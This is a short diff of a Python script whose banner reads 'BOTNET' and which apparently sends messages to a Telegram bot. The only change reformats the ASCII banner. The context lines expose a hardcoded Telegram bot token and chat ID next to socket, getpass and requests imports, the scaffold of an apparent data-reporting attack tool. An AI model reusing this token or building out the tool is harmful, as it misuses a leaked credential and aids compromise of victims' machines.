@@ -1,5 +1,6 @@
 import requests , socket , getpass ,os ,sys ,time
-   ____     ___    _____    _   _   _____   _____ 
+
+print('''   ____     ___    _____    _   _   _____   _____ 
   | __ )   / _ \  |_   _|  | \ | | | ____| |_   _|
   |  _ \  | | | |   | |    |  \| | |  _|     | |  
   | |_) | | |_| |   | |    | |\  | | |___    | |  
@@ -7,7 +8,7 @@ import requests , socket , getpass ,os ,sys ,time
  <.................CoD3d By Sm3R................>
                     |Ver : 1.1|
                     *****☆*****
-
+                                                           ''') 
 token , chat_id = "6295971889:AAFAUlw53uTcjxpz8xBxCrwdyiGE2Hrwb-k" , "1668896742"
 # send mesg def
 def Send_mess(message):
